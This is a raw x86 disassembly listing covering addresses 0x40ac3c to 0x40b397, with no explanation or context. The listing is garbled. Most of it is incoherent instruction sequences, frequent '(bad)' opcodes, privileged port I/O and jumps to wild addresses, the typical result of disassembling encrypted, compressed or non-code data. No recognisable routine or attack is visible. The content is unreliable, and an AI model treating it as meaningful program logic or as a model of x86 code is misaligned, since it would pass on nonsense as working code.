  40ac3c:	mov    eax,ds:0x64bd40eb
  40ac41:	dec    ecx
  40ac42:	and    eax,0x27e0394e
  40ac47:	push   edi
  40ac48:	test   DWORD PTR [ecx+0x4d128066],ebx
  40ac4e:	out    0xe,al
  40ac50:	bswap  edx
  40ac52:	dec    eax
  40ac53:	mov    DWORD PTR [esi+0x51],esp
  40ac56:	xor    bl,bl
  40ac58:	xchg   ch,bh
  40ac5a:	rcr    BYTE PTR [eax+0x71],0xb7
  40ac5e:	mov    bh,ch
  40ac60:	leave  
  40ac61:	adc    edi,DWORD PTR [edi+0x30]
  40ac64:	jbe    0x40ac7e
  40ac66:	push   edx
  40ac67:	shr    BYTE PTR [ecx-0x4],1
  40ac6a:	loop   0x40acd9
  40ac6c:	cli    
  40ac6d:	rol    BYTE PTR [ecx+0x618f57aa],1
  40ac73:	stos   BYTE PTR es:[edi],al
  40ac74:	adc    eax,0xa9003846
  40ac79:	inc    ebp
  40ac7a:	adc    esi,DWORD PTR fs:[edi-0x64]
  40ac7e:	adc    al,ah
  40ac80:	cmp    BYTE PTR [eax+0x1a],al
  40ac83:	cmp    eax,0xf1750b2d
  40ac88:	mov    bh,0xb9
  40ac8a:	fdivr  st(1),st
  40ac8c:	push   ds
  40ac8d:	add    DWORD PTR [eax+0x269b6b56],edi
  40ac93:	push   gs
  40ac95:	dec    esi
  40ac96:	ja     0x40ac32
  40ac98:	fcmovu st,st(2)
  40ac9a:	mov    edi,0xcf4d79a6
  40ac9f:	dec    ebp
  40aca0:	(bad)  
  40aca2:	sti    
  40aca3:	xchg   ecx,eax
  40aca4:	or     esp,DWORD PTR [esi-0x7a694d30]
  40acaa:	enter  0x8bd6,0x7b
  40acae:	les    edi,FWORD PTR [edx+edi*1-0x48]
  40acb2:	mov    edx,0x246b6507
  40acb7:	retf   0x7006
  40acba:	dec    ebp
  40acbb:	mov    edi,0xb114f3e0
  40acc0:	lock dec ebp
  40acc2:	mov    edi,0x75ea4821
  40acc7:	xlat   BYTE PTR ds:[ebx]
  40acc8:	(bad)  
  40acc9:	loopne 0x40ace5
  40accb:	(bad)  
  40accc:	push   esi
  40accd:	es leave 
  40accf:	ret    
  40acd0:	push   ss
  40acd1:	pop    ebx
  40acd2:	push   esp
  40acd3:	nop
  40acd4:	fsubr  DWORD PTR [esi-0x7d]
  40acd7:	sub    ecx,0x1
  40acda:	adc    al,bl
  40acdc:	rcl    BYTE PTR [edx+0x30dd0109],0xfd
  40ace3:	lods   eax,DWORD PTR ds:[esi]
  40ace4:	lahf   
  40ace5:	jg     0x40ad44
  40ace7:	adc    ebx,DWORD PTR [edi+0x430b8edf]
  40aced:	dec    eax
  40acee:	pop    es
  40acef:	in     al,0xdc
  40acf1:	lods   al,BYTE PTR ds:[esi]
  40acf2:	sub    BYTE PTR [esp+ebp*8],ch
  40acf5:	push   cs
  40acf6:	or     ebx,edx
  40acf8:	test   al,0x71
  40acfa:	xchg   ecx,eax
  40acfb:	nop
  40acfc:	scas   eax,DWORD PTR es:[edi]
  40acfd:	popf   
  40acfe:	std    
  40acff:	mov    ecx,DWORD PTR [eax-0x19]
  40ad02:	lds    esi,FWORD PTR [esi-0x2ecdee8e]
  40ad08:	push   eax
  40ad09:	pop    ebx
  40ad0a:	addr16 adc al,0x7c
  40ad0d:	std    
  40ad0e:	lea    esp,[edx-0x1a78ce1e]
  40ad14:	mov    bh,BYTE PTR [edi+0x7d]
  40ad17:	and    edx,DWORD PTR [edx]
  40ad19:	jge    0x40ad7f
  40ad1b:	mov    ds:0xbeb3f3ca,eax
  40ad20:	mov    dl,0xde
  40ad22:	jmp    0x40acc0
  40ad24:	jmp    0x7a92d24f
  40ad29:	sbb    bh,bl
  40ad2b:	sub    ecx,ecx
  40ad2d:	int    0xe0
  40ad2f:	cmp    ebx,DWORD PTR [ebp-0x2c]
  40ad32:	mov    eax,ds:0x975feca7
  40ad37:	sub    eax,0x1bda8029
  40ad3c:	pop    ebx
  40ad3d:	cmp    al,0xd4
  40ad3f:	test   DWORD PTR [ecx+0xf055a65],ecx
  40ad45:	sub    al,0x6c
  40ad47:	cmp    al,0x4f
  40ad49:	mov    edi,0x1e2dcbeb
  40ad4e:	or     cl,BYTE PTR [edi+0x3a]
  40ad51:	push   ebp
  40ad52:	imul   ebx,DWORD PTR ds:0x818f891,0x8d10da4
  40ad5c:	jnp    0x40adbf
  40ad5e:	nop
  40ad5f:	push   ecx
  40ad60:	lock mov ecx,0x31b664ff
  40ad66:	jle    0x40ad57
  40ad68:	scas   eax,DWORD PTR es:[edi]
  40ad69:	retf   
  40ad6a:	xor    BYTE PTR [esi-0x27],bl
  40ad6d:	daa    
  40ad6e:	test   ch,cl
  40ad70:	mov    DWORD PTR [edi],esp
  40ad72:	xchg   ebx,eax
  40ad73:	mov    ds:0xa742fe51,eax
  40ad78:	mov    edi,0xebeed3c4
  40ad7d:	mul    edi
  40ad7f:	push   esi
  40ad80:	mov    ds:0xd5d656ff,al
  40ad85:	sub    al,0x4b
  40ad87:	pushf  
  40ad88:	inc    esp
  40ad89:	fiadd  DWORD PTR [edi-0x14]
  40ad8c:	dec    ecx
  40ad8d:	fnsave [esi+0x2407667]
  40ad93:	cld    
  40ad94:	cmp    ebp,edi
  40ad96:	std    
  40ad97:	jmp    0x40ad4a
  40ad99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad9a:	scas   eax,DWORD PTR es:[edi]
  40ad9b:	mov    dl,0x78
  40ad9d:	adc    edx,DWORD PTR [ebx]
  40ad9f:	fst    st(5)
  40ada1:	fdiv   DWORD PTR [ebx+0xa]
  40ada4:	sbb    dl,bh
  40ada6:	cli    
  40ada7:	cdq    
  40ada8:	xchg   ebx,eax
  40ada9:	xor    edi,DWORD PTR [esi-0x58f5edaa]
  40adaf:	adc    BYTE PTR [ebx-0x1],0xa8
  40adb3:	push   edx
  40adb4:	mov    ebp,0xca6111e7
  40adb9:	aad    0xe4
  40adbb:	adc    BYTE PTR [ebx-0x4d2649c],0xe9
  40adc2:	adc    eax,0x545d3d83
  40adc7:	cwde   
  40adc8:	std    
  40adc9:	pushf  
  40adca:	push   ss
  40adcb:	xchg   ecx,eax
  40adcc:	jecxz  0x40adcf
  40adce:	outs   dx,BYTE PTR ds:[esi]
  40adcf:	aas    
  40add0:	jp     0x40ade1
  40add2:	je     0x40ae46
  40add4:	mov    eax,0x2593a07c
  40add9:	and    al,BYTE PTR [esi-0x261fc52a]
  40addf:	lea    ebp,[eax-0x4b]
  40ade2:	pop    esp
  40ade3:	fdivr  DWORD PTR [esi]
  40ade5:	push   eax
  40ade6:	dec    esi
  40ade7:	inc    edx
  40ade8:	shr    edx,cl
  40adea:	jnp    0x40ad8d
  40adec:	call   0xb8add0e7
  40adf1:	mov    bh,0xbe
  40adf3:	arpl   WORD PTR [edx+0x48],bx
  40adf6:	(bad)  
  40adf7:	jmp    0x541e:0x6e24c1d6
  40adfe:	adc    al,0xf4
  40ae00:	push   0x59
  40ae02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae03:	push   ss
  40ae04:	add    bl,dh
  40ae06:	dec    ecx
  40ae07:	add    eax,0x2dac3371
  40ae0c:	cmp    DWORD PTR [ebp+0x4191feb8],ebx
  40ae12:	test   eax,ebx
  40ae14:	add    al,0x17
  40ae16:	cdq    
  40ae17:	and    esp,eax
  40ae19:	inc    edi
  40ae1a:	sub    bh,BYTE PTR [edx]
  40ae1c:	out    0xe,eax
  40ae1e:	out    0x36,eax
  40ae20:	or     eax,0x3926a790
  40ae25:	idiv   dl
  40ae27:	mov    eax,ds:0x9e7199dd
  40ae2c:	fist   WORD PTR [edx]
  40ae2e:	std    
  40ae2f:	out    dx,eax
  40ae30:	popa   
  40ae31:	lahf   
  40ae32:	into   
  40ae33:	ret    
  40ae34:	rol    BYTE PTR [eax+0x6ec4dfcf],0x86
  40ae3b:	fs in  eax,dx
  40ae3d:	ret    
  40ae3e:	jmp    0x97543451
  40ae43:	adc    al,0x67
  40ae45:	pop    esi
  40ae46:	mov    BYTE PTR [esi+0x32],dl
  40ae49:	mov    edi,0x2d2418cf
  40ae4e:	xchg   esp,eax
  40ae4f:	mov    bh,0xeb
  40ae51:	loope  0x40ae88
  40ae53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae54:	sbb    ah,BYTE PTR [ecx+0xd]
  40ae57:	sub    al,0xf9
  40ae59:	(bad)  
  40ae5a:	dec    eax
  40ae5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae5c:	and    DWORD PTR [ebp-0x14615848],edi
  40ae62:	into   
  40ae63:	(bad)  
  40ae64:	and    DWORD PTR [edi-0x73c9944f],0xf0fc6df5
  40ae6e:	sub    al,0xc5
  40ae70:	outs   dx,BYTE PTR ds:[esi]
  40ae71:	arpl   WORD PTR [edx+0x4b8a25a6],ax
  40ae77:	(bad)
  40ae7a:	mov    DWORD PTR ds:0xc8cc90e3,edi
  40ae80:	jmp    0x40aea2
  40ae82:	out    dx,al
  40ae83:	add    eax,0xd50aa173
  40ae88:	int3   
  40ae89:	add    cl,BYTE PTR [eax-0x6f]
  40ae8c:	or     eax,0xbc384d3a
  40ae91:	xor    dh,BYTE PTR [edi]
  40ae93:	ins    DWORD PTR es:[edi],dx
  40ae94:	sub    eax,DWORD PTR [ebx+0x10]
  40ae97:	mov    al,ds:0x51a4d80d
  40ae9c:	enter  0x1bd0,0x1
  40aea0:	bound  ebx,QWORD PTR [edi+0x1feb40c3]
  40aea6:	mov    WORD PTR [ebp+0x1e],?
  40aea9:	cli    
  40aeaa:	pushf  
  40aeab:	aam    0x83
  40aead:	push   0xf6ea03d0
  40aeb2:	(bad)  
  40aeb3:	pop    edi
  40aeb4:	xchg   ebx,eax
  40aeb5:	mov    esi,0x7cd527b4
  40aeba:	mov    bl,0xca
  40aebc:	mov    edx,0x75cb5341
  40aec1:	mov    ebp,0x4181e4cf
  40aec6:	lods   al,BYTE PTR ds:[esi]
  40aec7:	jbe    0x40ae4c
  40aec9:	mov    edx,ss
  40aecb:	xchg   ebp,eax
  40aecc:	ss cmp eax,0x92083ce0
  40aed2:	stos   BYTE PTR es:[edi],al
  40aed3:	gs push ebx
  40aed5:	cli    
  40aed6:	jmp    FWORD PTR [ecx]
  40aed8:	cmp    BYTE PTR [ecx],bl
  40aeda:	xchg   edx,eax
  40aedb:	lahf   
  40aedc:	aam    0x0
  40aede:	pushf  
  40aedf:	cld    
  40aee0:	jp     0x40aea2
  40aee2:	dec    edx
  40aee3:	repnz inc esp
  40aee5:	call   0x17ef964d
  40aeea:	inc    esp
  40aeeb:	mov    bh,0xc5
  40aeed:	fimul  DWORD PTR [edi-0x32]
  40aef0:	xchg   DWORD PTR [edx],ebp
  40aef2:	arpl   cx,bx
  40aef4:	outs   dx,BYTE PTR ds:[esi]
  40aef5:	arpl   WORD PTR [esp+ebp*8+0x30],cx
  40aef9:	lds    esi,FWORD PTR [eax]
  40aefb:	cmc    
  40aefc:	stc    
  40aefd:	mov    cl,bl
  40aeff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af00:	out    dx,eax
  40af01:	and    bl,BYTE PTR [di-0x57dc]
  40af06:	div    BYTE PTR ds:0x5154219d
  40af0c:	add    eax,eax
  40af0e:	xchg   edi,eax
  40af0f:	cld    
  40af10:	(bad)  
  40af11:	daa    
  40af12:	cld    
  40af13:	sub    al,0xe1
  40af15:	in     eax,dx
  40af16:	sub    DWORD PTR [esi],edi
  40af18:	and    eax,0xc7a0349b
  40af1d:	xlat   BYTE PTR ds:[ebx]
  40af1e:	sbb    BYTE PTR [ebx],dh
  40af20:	les    ecx,FWORD PTR [ebx+0x29f03b2c]
  40af26:	inc    ebp
  40af27:	lea    esi,[ebp+ecx*8-0x1b]
  40af2b:	pop    ebx
  40af2c:	jle    0x40afab
  40af2e:	add    eax,0x5f534ca3
  40af33:	cli    
  40af34:	inc    esp
  40af35:	inc    esp
  40af36:	test   DWORD PTR [ecx-0x53c21803],0x495e011
  40af40:	addr16 hlt 
  40af42:	dec    ecx
  40af43:	pop    esp
  40af44:	or     al,0xb1
  40af46:	xchg   esp,eax
  40af47:	rol    DWORD PTR [edi],cl
  40af49:	xchg   edi,edx
  40af4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af4c:	mov    esp,0x2ae725b8
  40af51:	pop    ss
  40af52:	pop    edx
  40af53:	sbb    eax,DWORD PTR [eax+0x188f846b]
  40af59:	pushf  
  40af5a:	mov    dh,0x87
  40af5c:	inc    eax
  40af5d:	retf   0xa984
  40af60:	add    al,0x99
  40af62:	add    ah,BYTE PTR [edi+0x1ac80183]
  40af68:	rcl    BYTE PTR [edx+esi*8],0xe3
  40af6c:	pop    esp
  40af6d:	push   0xb642db17
  40af72:	nop
  40af73:	jo     0x40af4b
  40af75:	dec    ebp
  40af76:	in     al,dx
  40af77:	push   es
  40af78:	outs   dx,DWORD PTR ds:[esi]
  40af79:	pop    esi
  40af7a:	mov    ch,0xc3
  40af7c:	cld    
  40af7d:	js     0x40af56
  40af7f:	ret    
  40af80:	push   es
  40af81:	imul   ecx,DWORD PTR [ecx+0x7cc35a77],0x1af4423a
  40af8b:	dec    esi
  40af8c:	idiv   DWORD PTR ds:0xdf03f548
  40af92:	aas    
  40af93:	add    eax,0x908d8de5
  40af98:	call   0x95ec688b
  40af9d:	sbb    DWORD PTR [ebp*1+0x5ddf4cbf],edi
  40afa4:	stos   BYTE PTR es:[edi],al
  40afa5:	scas   eax,DWORD PTR es:[edi]
  40afa6:	ss xchg ebx,eax
  40afa8:	ficom  DWORD PTR [ebp+0x65ae04b6]
  40afae:	pop    edi
  40afaf:	jmp    0x40af85
  40afb1:	add    DWORD PTR [edi-0x15],eax
  40afb4:	pinsrw mm7,WORD PTR [edx+0x47469320],0xb8
  40afbc:	rcr    DWORD PTR [esi],cl
  40afbe:	adc    DWORD PTR [ebx+0x7b],0xffffffa5
  40afc2:	cdq    
  40afc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afc4:	or     al,0xea
  40afc6:	hlt    
  40afc7:	push   0x8b6d600b
  40afcc:	add    cl,BYTE PTR [edi-0x1a]
  40afcf:	stos   DWORD PTR es:[edi],eax
  40afd0:	add    BYTE PTR [eax],0xae
  40afd3:	push   ds
  40afd4:	retf   
  40afd5:	in     al,dx
  40afd6:	je     0x40b016
  40afd8:	xlat   BYTE PTR ds:[ebx]
  40afd9:	mov    ds:0xf61032ff,eax
  40afde:	push   0x5
  40afe0:	leave  
  40afe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afe2:	aam    0xd3
  40afe4:	aas    
  40afe5:	pusha  
  40afe6:	ret    0x2d2
  40afe9:	add    dh,0x33
  40afec:	daa    
  40afed:	sub    bh,BYTE PTR [esi+0xa]
  40aff0:	int3   
  40aff1:	sbb    al,0xce
  40aff3:	xchg   esp,eax
  40aff4:	stos   DWORD PTR es:[edi],eax
  40aff5:	fisttp QWORD PTR [eax]
  40aff7:	add    DWORD PTR [eax+0x3],0xffffffcd
  40affb:	dec    edi
  40affc:	mov    ds:0xf0e4fd57,al
  40b001:	xor    bl,bl
  40b003:	and    DWORD PTR [edi+0x26],0xd196ea04
  40b00a:	nop
  40b00b:	cmp    al,0x1a
  40b00d:	arpl   bp,dx
  40b00f:	ja     0x40afc1
  40b011:	mov    edi,0x5fd72afd
  40b016:	push   ebp
  40b017:	add    ebx,0xffffff80
  40b01a:	in     eax,0x84
  40b01c:	pop    esp
  40b01d:	(bad)  
  40b01e:	jb     0x40afa4
  40b020:	mov    dh,0x6e
  40b022:	retf   0x882f
  40b025:	jle    0x40afc2
  40b027:	repz sbb edi,edi
  40b02a:	hlt    
  40b02b:	call   0xc22b:0x21993b38
  40b032:	push   edx
  40b033:	mov    edx,0x1264d73e
  40b038:	xchg   ecx,eax
  40b039:	nop
  40b03a:	mov    ebp,0x535901fa
  40b03f:	scas   al,BYTE PTR es:[edi]
  40b040:	in     eax,dx
  40b041:	or     DWORD PTR ds:0xdee7eaee,esp
  40b047:	push   eax
  40b048:	push   0xffffffba
  40b04a:	jmp    0x40afff
  40b04c:	into   
  40b04d:	sbb    DWORD PTR [eax-0x543d20ec],esi
  40b053:	(bad)  
  40b054:	cwde   
  40b055:	scas   al,BYTE PTR es:[edi]
  40b056:	push   0xffffff93
  40b058:	xchg   BYTE PTR [eax],dl
  40b05a:	imul   ecx,DWORD PTR [edi+edx*2+0x1],0x6b
  40b05f:	ret    
  40b060:	pop    esp
  40b061:	jnp    0x40b080
  40b063:	cmp    al,0xd6
  40b065:	sbb    al,BYTE PTR [esi]
  40b067:	pop    edx
  40b068:	lahf   
  40b069:	pop    ecx
  40b06a:	sti    
  40b06b:	mov    ch,0x17
  40b06d:	pushf  
  40b06e:	std    
  40b06f:	xchg   DWORD PTR [ecx+0x28],edi
  40b072:	and    BYTE PTR [esi-0x7d],bl
  40b075:	or     ecx,DWORD PTR [esi]
  40b077:	idiv   BYTE PTR [ecx+0x30]
  40b07a:	(bad)  [ebx+0x28]
  40b07d:	iret   
  40b07e:	or     ebp,DWORD PTR [edi+edi*1-0x592cf1b5]
  40b085:	jb     0x40b0d5
  40b087:	jnp    0x40b09e
  40b089:	rol    BYTE PTR [ebx-0x2d],1
  40b08c:	xchg   esi,eax
  40b08d:	dec    ecx
  40b08e:	and    BYTE PTR [ecx-0x33],al
  40b091:	bound  edx,QWORD PTR [edx]
  40b093:	sbb    al,0xac
  40b095:	cmp    DWORD PTR [ebp+0x43],ebx
  40b098:	mov    bl,BYTE PTR [eax+0x55798d9]
  40b09e:	or     edi,DWORD PTR [edx+edx*4]
  40b0a1:	and    DWORD PTR [edx+0x22e9c84e],ecx
  40b0a7:	or     ebx,0x54
  40b0aa:	clc    
  40b0ab:	fcmovb st,st(2)
  40b0ad:	push   es
  40b0ae:	loop   0x40b043
  40b0b0:	std    
  40b0b1:	jmp    0xcd86e2cf
  40b0b6:	adc    ah,cl
  40b0b8:	dec    esp
  40b0b9:	cmp    eax,0x5c560026
  40b0be:	jmp    DWORD PTR [ecx*8+0x16712df]
  40b0c5:	push   edi
  40b0c6:	aad    0x65
  40b0c8:	push   es
  40b0c9:	int3   
  40b0ca:	mov    eax,0xd964517b
  40b0cf:	ds jb  0x40b114
  40b0d2:	leave  
  40b0d3:	aas    
  40b0d4:	xchg   ecx,eax
  40b0d5:	out    0x9f,al
  40b0d7:	mov    cl,0xe9
  40b0d9:	mov    cl,0xa0
  40b0db:	cli    
  40b0dc:	and    BYTE PTR [esi+0x79],dl
  40b0df:	nop
  40b0e0:	pop    ecx
  40b0e1:	xchg   edi,eax
  40b0e2:	test   DWORD PTR [ecx+0x4a6520fc],esi
  40b0e8:	mov    bh,BYTE PTR [edi]
  40b0ea:	dec    ebx
  40b0eb:	imul   esp,DWORD PTR [ebx],0xffffff82
  40b0ee:	mov    ds:0x8d8d4bc6,al
  40b0f3:	pop    ds
  40b0f4:	inc    edx
  40b0f5:	or     BYTE PTR [ecx+0x7],dh
  40b0f8:	jne    0x40b0b0
  40b0fa:	xchg   ecx,eax
  40b0fb:	push   0x27971e1c
  40b100:	aas    
  40b101:	add    al,0xb2
  40b103:	inc    esi
  40b104:	arpl   WORD PTR [eax-0x51dcb2c0],bx
  40b10a:	sbb    dh,BYTE PTR [edi-0x143380c3]
  40b110:	out    dx,eax
  40b111:	rcr    DWORD PTR [ebx-0x3d],1
  40b114:	ret    
  40b115:	xchg   edx,eax
  40b116:	pusha  
  40b117:	rcl    BYTE PTR [esp+ebp*4-0x4f96a05e],1
  40b11e:	pop    esi
  40b11f:	xor    ebx,DWORD PTR [edi-0x266c9e82]
  40b125:	jge    0x40b170
  40b127:	(bad)  
  40b128:	out    0xe8,al
  40b12a:	dec    ebx
  40b12b:	and    bh,BYTE PTR [ebp-0x4978e0ef]
  40b131:	xchg   edx,eax
  40b132:	gs jecxz 0x40b0fb
  40b135:	push   ds
  40b136:	gs dec ecx
  40b138:	inc    ecx
  40b139:	push   eax
  40b13a:	ins    DWORD PTR es:[edi],dx
  40b13b:	jp     0x40b0d0
  40b13d:	xor    al,0x7c
  40b13f:	push   DWORD PTR [edx]
  40b141:	xchg   ebp,eax
  40b142:	sub    DWORD PTR [ebp+edi*2+0x15],0xffffffe1
  40b147:	and    edi,DWORD PTR [ecx]
  40b149:	xor    dh,ah
  40b14b:	lods   eax,DWORD PTR ds:[esi]
  40b14c:	repz mov edx,0xa3f56cff
  40b152:	lods   eax,DWORD PTR ds:[esi]
  40b153:	fisub  WORD PTR [eax+0x130f4555]
  40b159:	(bad)  
  40b15a:	xchg   ebp,eax
  40b15b:	cmovb  edi,DWORD PTR [edx+0x2f2524e1]
  40b162:	rol    BYTE PTR [edx],0x40
  40b165:	jno    0x40b1bb
  40b167:	lods   al,BYTE PTR ds:[esi]
  40b168:	mov    esp,0x4299e2d4
  40b16d:	shr    DWORD PTR [edx+0x72de2b25],1
  40b173:	xor    al,0x51
  40b175:	int    0x5b
  40b177:	cs gs stos BYTE PTR es:[edi],al
  40b17a:	cmp    al,BYTE PTR [ebx-0x1f]
  40b17d:	sahf   
  40b17e:	jne    0x40b138
  40b180:	cmp    ecx,DWORD PTR [eax]
  40b182:	cwde   
  40b183:	push   cs
  40b184:	out    dx,eax
  40b185:	xlat   BYTE PTR ds:[ebx]
  40b186:	pushf  
  40b187:	xor    ch,BYTE PTR [esi]
  40b189:	jns    0x40b11a
  40b18b:	test   edi,eax
  40b18d:	xor    eax,0xee9aaed0
  40b192:	sti    
  40b193:	idiv   BYTE PTR [ecx+0xb4935f7]
  40b199:	pushf  
  40b19a:	xchg   esi,eax
  40b19b:	in     eax,0x55
  40b19d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b19e:	frstor [ebp-0x36977e2d]
  40b1a4:	fld    DWORD PTR [esi]
  40b1a6:	xchg   edi,eax
  40b1a7:	(bad)  
  40b1a8:	xchg   ebx,eax
  40b1a9:	stos   DWORD PTR es:[edi],eax
  40b1aa:	das    
  40b1ab:	inc    esp
  40b1ac:	and    DWORD PTR [ecx-0x29],edi
  40b1af:	cmp    ah,BYTE PTR [eax-0xe3912e5]
  40b1b5:	sub    DWORD PTR [eax],edi
  40b1b7:	mov    bh,0x88
  40b1b9:	cmp    edx,DWORD PTR es:[eax-0x6dba00f5]
  40b1c0:	jle    0x40b22a
  40b1c2:	(bad)  
  40b1c3:	ins    DWORD PTR es:[edi],dx
  40b1c4:	sub    al,0x65
  40b1c6:	icebp  
  40b1c7:	and    eax,DWORD PTR [ecx+edi*2+0x54]
  40b1cb:	or     ebx,DWORD PTR [edx+0x71d61d40]
  40b1d1:	xor    eax,0xc1efefa4
  40b1d6:	sub    DWORD PTR [eax-0x71c01112],eax
  40b1dc:	pusha  
  40b1dd:	push   0xffffffb0
  40b1df:	push   eax
  40b1e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1e1:	ror    DWORD PTR [esi],0x67
  40b1e4:	mov    DWORD PTR [ecx-0x57],eax
  40b1e7:	xchg   BYTE PTR [ebx+ebp*8+0x24],ah
  40b1eb:	mov    ?,WORD PTR [edi]
  40b1ed:	pusha  
  40b1ee:	jae    0x40b250
  40b1f0:	adc    BYTE PTR [eax],ch
  40b1f2:	(bad)  
  40b1f3:	lahf   
  40b1f4:	fadd   QWORD PTR [ebx+0x7f]
  40b1f7:	mov    ecx,0xbafde943
  40b1fc:	aam    0x6c
  40b1fe:	add    BYTE PTR [eax],dl
  40b200:	cld    
  40b201:	fcom   QWORD PTR [ecx-0x14]
  40b204:	loop   0x40b22c
  40b206:	(bad)  
  40b207:	jg     0x40b278
  40b209:	pop    edi
  40b20a:	fst    QWORD PTR ds:0xfcf0f88f
  40b210:	shl    bl,cl
  40b212:	(bad)  
  40b213:	imul   BYTE PTR [esi+0x68447987]
  40b219:	test   al,0xf8
  40b21b:	push   edi
  40b21c:	jb     0x40b1ce
  40b21e:	add    eax,0x4163bda0
  40b223:	jb     0x40b210
  40b225:	not    BYTE PTR [edx+eiz*4+0x40f914dc]
  40b22c:	dec    ebp
  40b22d:	scas   al,BYTE PTR es:[edi]
  40b22e:	push   esi
  40b22f:	lods   eax,DWORD PTR ds:[esi]
  40b230:	sbb    esp,DWORD PTR [eax-0x50]
  40b233:	push   0xffffffd5
  40b235:	shr    BYTE PTR [esi-0xd],0xc6
  40b239:	rol    bl,cl
  40b23b:	xchg   edx,eax
  40b23c:	mov    esi,0x1340230f
  40b241:	fcmovnb st,st(1)
  40b243:	pop    ss
  40b244:	in     eax,0x85
  40b246:	(bad)  
  40b247:	mov    cl,0x31
  40b249:	push   ecx
  40b24a:	sbb    DWORD PTR [esi-0x3b],ebp
  40b24d:	push   eax
  40b24e:	repnz sub bh,ah
  40b251:	mov    ebp,0x598a72bf
  40b256:	xchg   ebx,eax
  40b257:	xchg   BYTE PTR [esi-0x3c29c908],ah
  40b25d:	nop
  40b25e:	pop    edi
  40b25f:	cmp    al,0xa7
  40b261:	and    eax,0x7e6a714f
  40b266:	xor    DWORD PTR ds:0x7e5d52b3,ebx
  40b26c:	mov    ch,0x5a
  40b26e:	adc    cl,BYTE PTR [esi+0x3a01be7c]
  40b274:	ja     0x40b284
  40b276:	inc    ebx
  40b277:	xlat   BYTE PTR ds:[ebx]
  40b278:	sub    al,0xc2
  40b27a:	or     eax,0x84da63ea
  40b27f:	fwait
  40b280:	xor    ch,ah
  40b282:	stos   BYTE PTR es:[edi],al
  40b283:	jmp    0x8b792169
  40b288:	mov    dl,0x23
  40b28a:	ror    ch,1
  40b28c:	xchg   edi,eax
  40b28d:	cmc    
  40b28e:	cmp    BYTE PTR [esi+0x235b74b3],dh
  40b294:	pop    ebp
  40b295:	outs   dx,BYTE PTR ds:[esi]
  40b296:	add    eax,0xeef556e7
  40b29b:	pop    ds
  40b29c:	bound  ebx,QWORD PTR [ecx]
  40b29e:	sub    BYTE PTR [edi+0x57d6605d],0x50
  40b2a5:	inc    edi
  40b2a6:	sbb    al,0x39
  40b2a8:	jmp    0x40b2bf
  40b2aa:	ret    0xee07
  40b2ad:	mov    DWORD PTR [edx],edi
  40b2af:	out    dx,eax
  40b2b0:	std    
  40b2b1:	(bad)  
  40b2b2:	inc    DWORD PTR ds:0x84d262cd
  40b2b8:	ds call 0x321d10c2
  40b2be:	inc    edi
  40b2bf:	push   esp
  40b2c0:	ja     0x40b280
  40b2c2:	adc    ebp,ebx
  40b2c4:	fisubr DWORD PTR [ecx+edx*8]
  40b2c7:	repnz inc edx
  40b2c9:	xchg   esi,eax
  40b2ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2cb:	mov    ecx,0x82d2fa92
  40b2d0:	(bad)  
  40b2d1:	div    eax
  40b2d3:	pop    esi
  40b2d4:	cmp    ah,ah
  40b2d6:	jnp    0x40b29a
  40b2d8:	out    0x20,eax
  40b2da:	xchg   ecx,eax
  40b2db:	sahf   
  40b2dc:	out    dx,al
  40b2dd:	push   ecx
  40b2de:	mov    edi,0xc5f5f945
  40b2e3:	retf   0xb893
  40b2e6:	mov    al,ds:0x3ab8f97e
  40b2eb:	mul    BYTE PTR [esi+0x5a94d942]
  40b2f1:	sti    
  40b2f2:	call   0x7b970638
  40b2f7:	cs jge 0x40b343
  40b2fa:	(bad)  
  40b2fb:	int    0x99
  40b2fd:	fisub  WORD PTR [esi+0x4c]
  40b300:	int3   
  40b301:	ret    0xa1e8
  40b304:	std    
  40b305:	mov    WORD PTR [eax+0x647436ea],gs
  40b30b:	cld    
  40b30c:	jl     0x40b347
  40b30e:	repnz sbb eax,0x1e9fb560
  40b314:	jg     0x40b30d
  40b316:	push   esi
  40b317:	icebp  
  40b318:	test   BYTE PTR [edx],cl
  40b31a:	mov    ebp,0xc26e3cb0
  40b31f:	xor    edi,DWORD PTR [ebx+0x2]
  40b322:	test   eax,0x6200cc77
  40b327:	xor    ebx,DWORD PTR [esi]
  40b329:	adc    ebp,DWORD PTR [ecx-0x17]
  40b32c:	push   esi
  40b32d:	mov    ebx,0xa8d8c515
  40b333:	call   0xf487:0x3f1ee321
  40b33a:	mov    al,0xd9
  40b33c:	loop   0x40b2e5
  40b33e:	imul   ebx,edx,0xffffffa5
  40b341:	mov    edx,0xa0d4dd9a
  40b346:	jmp    0xd423:0xcee7b894
  40b34d:	inc    edx
  40b34e:	sbb    BYTE PTR [ebp-0x17],0x34
  40b352:	(bad)  
  40b353:	rcr    DWORD PTR [ecx-0x29],cl
  40b356:	sub    DWORD PTR [ebx],ebx
  40b358:	(bad)  
  40b359:	pop    eax
  40b35a:	fwait
  40b35b:	pop    edx
  40b35c:	mov    ah,0x4b
  40b35e:	or     al,0x89
  40b360:	and    bh,BYTE PTR [edi+0x7b823a1a]
  40b366:	mov    dh,bh
  40b368:	pop    ds
  40b369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b36a:	out    0x93,eax
  40b36c:	cmp    BYTE PTR [ebp+0x117e941a],dh
  40b372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b373:	xchg   ecx,eax
  40b374:	ins    DWORD PTR es:[edi],dx
  40b375:	or     ah,BYTE PTR [eax-0x19c3bb82]
  40b37b:	and    ecx,DWORD PTR [esi+0x4dc893e6]
  40b381:	test   BYTE PTR [ebp+0x2],dh
  40b384:	cld    
  40b385:	inc    eax
  40b386:	or     al,BYTE PTR [esi+0x57]
  40b389:	call   0xd1ee12b5
  40b38e:	out    dx,eax
  40b38f:	test   eax,0xa1c3c7b5
  40b394:	shl    DWORD PTR [edi],0x8c
  40b397:	pusha  
